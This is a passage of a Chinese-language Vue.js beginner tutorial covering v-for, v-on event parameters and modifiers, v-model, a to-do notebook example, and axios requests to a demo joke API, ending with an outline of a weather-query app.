<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;添加数据&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;remove&quot;</span> <span class="attr">value</span>=<span class="string">&quot;移除数据&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(x,index) in arr&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123; index+1 &#125;&#125;深圳大学校区：&#123;&#123; x &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-for</span>=<span class="string">&quot;item in vegetable&quot;</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;item.name&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;item.name&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            arr:[<span class="string">&quot;丽湖&quot;</span>,<span class="string">&quot;粤海&quot;</span>,<span class="string">&quot;沧海&quot;</span>],</span></span><br><span class="line">            vegetable:[</span><br><span class="line"><span class="javascript">                &#123;<span class="attr">name</span>:<span class="string">&quot;西兰花炒蛋&quot;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                &#123;<span class="attr">name</span>:<span class="string">&quot;蛋炒西兰花&quot;</span>&#125;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            add:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.vegetable.push(&#123;<span class="attr">name</span>:<span class="string">&quot;花菜炒蛋&quot;</span>&#125;);</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            remove:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.vegetable.shift();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="v-on-补充"><a href="#v-on-补充" class="headerlink" title="v-on 补充"></a>v-on 补充</h4><p>传递自定义参数，事件修饰符</p>
<p>文档传送门：<a class="link"   href="https://cn.vuejs.org/v2/api/#v-on" >https://cn.vuejs.org/v2/api/#v-on<i class="fas fa-external-link-alt"></i></a></p>
<ul>
<li>事件绑定的方法写成函数调用的形式，可以传入自定义参数</li>
<li>定义方法时需要定义形参来接收传入的实参</li>
<li>事件的后面跟上 .修饰符 可以对事件进行限制</li>
<li>.enter 可以显示触发的按键为回车</li>
<li>事件修饰符有多种</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>  @<span class="attr">click</span>=<span class="string">&quot;doIt(666,&#x27;老铁&#x27;)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;sayHi&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            doIt:<span class="function"><span class="keyword">function</span> (<span class="params">p1,p2</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&quot;做It&quot;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(p1,p2);</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            sayHi:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;吃了没&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h4><ul>
<li><p>v-model 指令的作用是便捷获取和设置表单元素的值（双向数据绑定）</p>
</li>
<li><p>绑定的数据会和表单元素相关联</p>
</li>
<li><p>绑定的数据:left_right_arrow:表单元素的值</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;修改message&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;setM&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;getM&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            message:<span class="string">&quot;hello world&quot;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            getM:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.message)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            setM:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.message = <span class="string">&quot;byebye&quot;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="实例（记事本）"><a href="#实例（记事本）" class="headerlink" title="实例（记事本）"></a>实例（记事本）</h4><p><strong>功能：</strong></p>
<ol>
<li>新增：<ol>
<li>生成列表结构（v-for  数组）</li>
<li>获取用户输入（v-model）</li>
<li>回车，新增数据（v-on.enter  添加数据）</li>
</ol>
</li>
<li>删除：<ol>
<li>点击删除指定内容（v-on splice 索引）</li>
</ol>
</li>
<li>统计：<ol>
<li>统计信息个数（v-text length）</li>
</ol>
</li>
<li>清空：<ol>
<li>点击清除所有信息（v-on）</li>
</ol>
</li>
<li>隐藏：<ol>
<li>没有数据时，隐藏元素（v-show v-if 数组非空）</li>
</ol>
</li>
</ol>
<p><strong>重点：</strong></p>
<ul>
<li>列表结构可以通过 v-for 指令结合数据生成</li>
<li>v-on 结合事件修饰符可以对事件进行限制，比如 .enter</li>
<li>v-on 在绑定事件时可以传递自定义参数</li>
<li>通过 v-model 可以快速的设置和获取表单元素的值</li>
<li>基于数据的开发方式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>记事本<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--主体区域--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">&quot;todoapp&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--输入框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>记事本<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model</span>=<span class="string">&quot;inputValue&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;add&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">autofocus</span>=<span class="string">&quot;autofocus&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入任务&quot;</span> <span class="attr">class</span>=<span class="string">&quot;new-todo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--列表区域--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;todo-list&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;todo&quot;</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,index) in list&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;view&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123;index + 1&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;destory&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;remove(index)&quot;</span>&gt;</span>x<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--列表清空--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;todo-count&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;list.length !== 0&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123;list.length&#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">             items left</span><br><span class="line">        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;clear-completed&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;clear&quot;</span> <span class="attr">v-if</span>=<span class="string">&quot;list.length !== 0&quot;</span>&gt;</span>Clear<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--底部--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#todoapp&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            list:[<span class="string">&quot;粤海&quot;</span>,<span class="string">&quot;沧海&quot;</span>,<span class="string">&quot;丽湖&quot;</span>],</span></span><br><span class="line"><span class="javascript">            inputValue:<span class="string">&quot;好好学习，天天向上&quot;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            add:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.list.push(<span class="built_in">this</span>.inputValue);</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            remove:<span class="function"><span class="keyword">function</span> (<span class="params">index</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.list.splice(index,<span class="number">1</span>);</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            clear:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.list = [];</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="三、网络应用"><a href="#三、网络应用" class="headerlink" title="三、网络应用"></a>三、网络应用</h2><p>Vue结合网络数据开发应用</p>
<h3 id="3-1-axios"><a href="#3-1-axios" class="headerlink" title="3.1 axios"></a>3.1 axios</h3><p>功能强大的网络请求库</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/axios/dist/axios.min,js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	axios.get(地址?key=value$key2=value2).then(<span class="function"><span class="keyword">function</span>(<span class="params">respose</span>)</span>&#123;&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;&#125;);</span></span><br><span class="line"><span class="javascript">	axios.post(地址,key=value,key2=value2).then(<span class="function"><span class="keyword">function</span>(<span class="params">respose</span>)</span>&#123;&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;&#125;);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>axios 必须先导入才可以使用</li>
<li>使用 get 或 post 方法即可发送对应的请求</li>
<li>then 方法中的回调函数会在请求成功或失败时触发</li>
<li>通过回调函数的形式可以获取相应内容，或错误信息</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/axios/0.21.1/axios.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;get请求&quot;</span> <span class="attr">class</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;post请求&quot;</span> <span class="attr">class</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.querySelector(<span class="string">&quot;.get&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        axios.get(<span class="string">&quot;https://autumnfish.cn/api/joke/list?num=6&quot;</span>)</span></span><br><span class="line"><span class="javascript">        .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(response);</span></span><br><span class="line"><span class="javascript">        &#125;,<span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(err);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.querySelector(<span class="string">&quot;.post&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        axios.post(<span class="string">&quot;https://autumnfish.cn/api/user/reg&quot;</span>,</span></span><br><span class="line"><span class="javascript">        &#123;<span class="attr">username</span>:<span class="string">&quot;红烧西兰花&quot;</span>&#125;)</span></span><br><span class="line"><span class="javascript">        .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(response);</span></span><br><span class="line"><span class="javascript">        &#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(err);</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="3-2-axios-vue"><a href="#3-2-axios-vue" class="headerlink" title="3.2 axios+vue"></a>3.2 axios+vue</h3><p>axios 如何结合 vue 开发网络应用</p>
<ul>
<li>axios 回调函数中的 this 已经改变，无法访问到 data 中数据</li>
<li>把 this 保存起来，回调函数中直接使用保存的 this 即可</li>
<li>和本地应用的最大区别时改变了数据来源</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/axios/0.21.1/axios.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;获取笑话&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;getJoke&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;joke&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            joke:<span class="string">&quot;很好笑的笑话&quot;</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            getJoke:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> that = <span class="built_in">this</span>;</span></span><br><span class="line"><span class="javascript">                axios.get(<span class="string">&quot;https://autumnfish.cn/api/joke&quot;</span>)</span></span><br><span class="line"><span class="javascript">                    .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>)</span>&#123;</span></span><br><span class="line">                        that.joke = response.data;</span><br><span class="line"><span class="javascript">                    &#125;,<span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                        <span class="built_in">console</span>.log(err);</span></span><br><span class="line">                    &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="实例（天气查询）"><a href="#实例（天气查询）" class="headerlink" title="实例（天气查询）"></a>实例（天气查询）</h3><p><strong>功能：</strong></p>
<ol>
<li>回车查询<ol>
<li>按下回车（v-on.enter）</li>
<li>查询数据（axios 接口 v-model）</li>
<li>渲染数据（v-for 数组 that 或使用箭头函数）</li>
</ol>
</li>
</ol>
<ul>
<li>应用的逻辑代码建议和页面分离，使用单独的 js 文件编写</li>
<li>axios 回调函数中 this 指向改变了，需要额外保存一份</li>
<li>服务器返回的数据比较复杂时，获取的时候需要注意层级结构</li>
</ul>
<ol start="2">
<li>点击查询<ol>
<li>点击城市（v-on 自定义参数）</li>
<li>查询数据（this.方法()）</li>
<li>渲染数据（this.方法()）</li>
</ol>
</li>
</ol>
<ul>
<li>自定义参数可以让代码的复用性更高</li>
<li>methods 中定义的方法内部，可以通过 this 关键字点出其他的方法</li>
</ul>
